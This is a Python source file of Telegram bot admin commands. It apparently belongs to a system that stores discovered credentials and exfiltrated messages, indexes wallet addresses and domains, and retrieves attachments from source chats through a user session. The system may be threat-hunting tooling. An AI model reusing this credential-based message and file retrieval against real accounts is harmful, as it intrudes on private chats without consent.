"""Bot listener commands handlers."""

from .common import *

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subject = _subject_label(update.effective_user.id)
    try:
        from app.services.engagement import track_owned_bot_start

        tracking = await track_owned_bot_start(update, context)
        logger.info("📥 Received /start from subject=%s tracking=%s", subject, tracking["status"])
    except Exception as exc:
        logger.warning("[Engagement] /start tracking failed for subject=%s: %s", subject, exc)
    if not is_admin(update):
        logger.info("🚫 subject=%s is not an admin. Sending guest start.", subject)
        await _reply_and_delete(update,
            "Welcome. Use /starthunter in a private chat to login.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    logger.info("✅ subject=%s is an admin. Sending admin start.", subject)
    await _reply_and_delete(update, "Bot online. Use /help for commands.")

async def track_private_inbound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Record funnel progress without retaining private message content."""
    if context.user_data.get("owned_bot_first_inbound_tracked"):
        return
    try:
        from app.services.engagement import track_owned_bot_first_inbound

        await track_owned_bot_first_inbound(update, context)
        context.user_data["owned_bot_first_inbound_tracked"] = True
    except Exception as exc:
        logger.warning(
            "[Engagement] first-inbound tracking failed for subject=%s: %s",
            _subject_label(update.effective_user.id),
            exc,
        )

async def opt_out_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Honor an explicit opt-out on every monitor bot owned by this deployment."""
    try:
        from app.services.engagement import track_owned_bot_opt_out

        await track_owned_bot_opt_out(update, context)
    except Exception as exc:
        logger.warning(
            "[Engagement] opt-out tracking failed for subject=%s: %s",
            _subject_label(update.effective_user.id),
            exc,
        )
    await _reply_and_delete(update,
        "Opted out. No automated messages will be sent."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_user_admin = is_admin(update)

    # Show all available bots in the help text
    bot_list = ", ".join([f"@{u}" for u in _bot_usernames.values()])

    if is_user_admin:
        help_text = (
            "Commands:\n"
            "/status - System health\n"
            "/pause - Pause operations\n"
            "/resume - Resume operations\n"
            "/restart - Restart bot\n"
            "/starthunter - Login account\n"
            "/bots - List bots\n"
            "/telemetry - Telemetry\n"
            "/getfile <id> - Get attachment\n"
            "/backfill - Re-broadcast stuck messages"
        )
    else:
        help_text = (
            "Commands:\n"
            "/starthunter - Login account\n"
            "/help - This help"
        )

    await _reply_and_delete(update, help_text, parse_mode=ParseMode.MARKDOWN)

async def bots_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all available bots and their lock status."""
    if not is_admin(update):
        await _reply_and_delete(update, "Admin only.")
        return

    lines = ["Bot Rotation Pool\n"]
    for token, username in _bot_usernames.items():
        status = "Locked" if token in _locked_bots else "Available"
        lines.append(f"• @{username} — {status}")

    lines.append(f"\n**Total**: {len(_bot_usernames)} bots")
    await _reply_and_delete(update, "\n".join(lines), parse_mode=ParseMode.MARKDOWN)

async def _execute_db(query_builder):
    return await _execute_async_shared(query_builder)

async def _telemetry_count(indicator_type: str) -> int:
    response = await _execute_db(
        db.table("telemetry_indicators")
        .select("id", count="exact")
        .eq("indicator_type", indicator_type)
        .limit(1)
    )
    return int(response.count or 0)

async def _fetch_telemetry_summary() -> dict[str, Any]:
    counts = {
        indicator_type: await _telemetry_count(indicator_type)
        for indicator_type in INDICATOR_TYPES
    }
    recent_wallets = await _execute_db(
        db.table("telemetry_indicators")
        .select("indicator_value, first_seen_at")
        .eq("indicator_type", "wallet_address")
        .order("first_seen_at", desc=True)
        .limit(5)
    )
    recent_domains = await _execute_db(
        db.table("telemetry_indicators")
        .select("indicator_value, first_seen_at")
        .eq("indicator_type", "network_domain")
        .order("first_seen_at", desc=True)
        .limit(5)
    )
    gateway_credentials = await _execute_db(
        db.table("discovered_credentials")
        .select("id, meta")
        .eq("status", "active")
        .not_.is_("meta->gateway_telemetry->>configured_webhook_url", "null")
        .limit(5)
    )
    return {
        "counts": counts,
        "recent_wallets": recent_wallets.data or [],
        "recent_domains": recent_domains.data or [],
        "gateway_credentials": gateway_credentials.data or [],
    }

def _telemetry_value_lines(rows: list[dict[str, Any]], empty_text: str) -> list[str]:
    if not rows:
        return [escape_markdown(empty_text, version=2)]
    lines = []
    for row in rows:
        value = str(row.get("indicator_value") or "").strip()
        if value:
            lines.append(f"• `{escape_markdown(value[:96], version=2)}`")
    return lines or [escape_markdown(empty_text, version=2)]

def _format_telemetry_summary(summary: dict[str, Any]) -> str:
    counts = summary.get("counts") or {}
    gateway_lines: list[str] = []
    for row in summary.get("gateway_credentials") or []:
        meta = row.get("meta") if isinstance(row, dict) else {}
        gateway = (meta or {}).get("gateway_telemetry") if isinstance(meta, dict) else {}
        endpoint = (gateway or {}).get("configured_webhook_url") if isinstance(gateway, dict) else None
        if endpoint:
            gateway_lines.append(f"• `{escape_markdown(str(endpoint)[:96], version=2)}`")
    if not gateway_lines:
        gateway_lines.append(escape_markdown("No active webhook gateway endpoints indexed.", version=2))

    lines = [
        "*Telemetry Analytics*",
        "",
        f"*Network Domains:* `{counts.get('network_domain', 0)}`",
        f"*Canonical URLs:* `{counts.get('canonical_url', 0)}`",
        f"*Blockchain Wallets:* `{counts.get('wallet_address', 0)}`",
        "",
        "*Webhook Gateway Endpoints*",
        *gateway_lines,
        "",
        "*Recent Wallet Entities*",
        *_telemetry_value_lines(summary.get("recent_wallets") or [], "No wallet entities indexed."),
        "",
        "*Recent Network Domains*",
        *_telemetry_value_lines(summary.get("recent_domains") or [], "No network domains indexed."),
    ]
    return "\n".join(lines)

async def telemetry_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await _reply_and_delete(update, "Admin only.")
        return

    try:
        summary = await _fetch_telemetry_summary()
        await _reply_and_delete(update,
            _format_telemetry_summary(summary),
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"Telemetry summary failed: {e}")
        await _reply_and_delete(update, "Telemetry unavailable.")

def _is_uuid(value: str) -> bool:
    try:
        uuid.UUID(value)
        return True
    except (TypeError, ValueError):
        return False

async def _fetch_attachment_message(target_id: str) -> dict[str, Any] | None:
    if _is_uuid(target_id):
        response = await _execute_db(
            db.table("exfiltrated_messages")
            .select("*")
            .eq("id", target_id)
            .limit(1)
        )
    elif target_id.isdigit():
        response = await _execute_db(
            db.table("exfiltrated_messages")
            .select("*")
            .eq("telegram_msg_id", int(target_id))
            .limit(1)
        )
    else:
        return None
    rows = response.data or []
    return rows[0] if rows else None

async def _resolve_attachment_source_chat_id(row: dict[str, Any]) -> int | str | None:
    if row.get("chat_id"):
        return row["chat_id"]

    credential_id = row.get("credential_id")
    if not credential_id:
        return None

    response = await _execute_db(
        db.table("discovered_credentials")
        .select("chat_id")
        .eq("id", credential_id)
        .limit(1)
    )
    rows = response.data or []
    if not rows:
        return None
    return rows[0].get("chat_id")

def _format_archive_result_message(result) -> str:
    if result.ok:
        return "✅ Attachment retrieval complete."
    if result.code == "too_large":
        return f"Attachment skipped: {result.detail}"
    if result.code == "timeout":
        return f"Attachment transfer timed out: {result.detail}"
    if result.code == "not_found":
        return "Attachment payload is no longer available upstream."
    if result.code == "upload_failed":
        return f"Attachment upload failed after retry: {result.detail or 'upstream transfer failed'}"
    if result.code == "session_unavailable":
        return "Attachment retrieval is temporarily unavailable because no user session is ready."
    return "Attachment payload is no longer available upstream."

async def getfile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        await _reply_and_delete(update,
            "For security, /getfile only works in a private chat with me."
        )
        return

    if not is_admin(update):
        await _reply_and_delete(update, "Admin only.")
        return

    target_id = (context.args[0] if context and context.args else "").strip()
    if not target_id:
        await _reply_and_delete(update, "Usage: /getfile <telegram_msg_id or message UUID>")
        return

    row = await _fetch_attachment_message(target_id)
    if not row:
        await _reply_and_delete(update, "Attachment message not found.")
        return

    if row.get("media_type") in (None, "text"):
        await _reply_and_delete(update, "No attachment in that message.")
        return

    source_chat_id = await _resolve_attachment_source_chat_id(row)
    if not source_chat_id:
        await _reply_and_delete(update, "Source chat unavailable.")
        return

    await _reply_and_delete(update, "Retrieving attachment...")
    from app.services.user_agent_srv import user_agent

    result = await user_agent.archive_media_transiently(
        source_chat_id,
        int(row["telegram_msg_id"]),
        target_chat_id=update.effective_chat.id,
        caption=f"Archived Attachment [ID: {row['id']}]",
    )
    await _reply_and_delete(update, _format_archive_result_message(result))

async def backfill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Triggers re-broadcast of messages stuck in General topic."""
    if not is_admin(update):
        await _reply_and_delete(update, "Admin only.")
        return

    await _reply_and_delete(update,
        "Backfill started.\n"
        "Messages stuck in General will be re-queued to their correct topics.\n"
        "Check the monitor group for progress.",
        parse_mode=ParseMode.MARKDOWN
    )
    from app.workers.tasks.audit_tasks import backfill_general_messages
    backfill_general_messages.delay()

async def schedule_deletion(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 30):
    """Deletes a message after a delay."""
    async def delete_task():
        await asyncio.sleep(delay)
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception as e:
            logger.error(f"Failed to delete sensitive message {message_id}: {e}")

    asyncio.create_task(delete_task())

async def _wipe_conversation(context: ContextTypes.DEFAULT_TYPE, chat_id: int, bot_message_ids: list):
    """
    Wipe all tracked bot messages + the user's incoming messages from this session.
    Runs silently — delete errors are suppressed (message may already be gone).
    Also attempts to delete the user's /starthunter command itself.

    Telegram only allows bots to delete their OWN messages in private chats
    unless the bot is an admin. In a DM the bot is always the sender for its
    own messages so those deletions succeed. User messages can only be deleted
    by the bot if it has delete_messages permission — in a private chat this
    is NOT granted, so user-side messages will silently fail and that is fine.
    """
    ids_to_delete = list(bot_message_ids or [])

    async def _do_wipe():
        await asyncio.sleep(1)  # tiny delay so final ACK from Telegram is processed
        for msg_id in ids_to_delete:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception as _swallowed:
                logger.debug(f"[suppressed] {_swallowed}")  # already deleted or no permission — both are fine

    asyncio.create_task(_do_wipe())
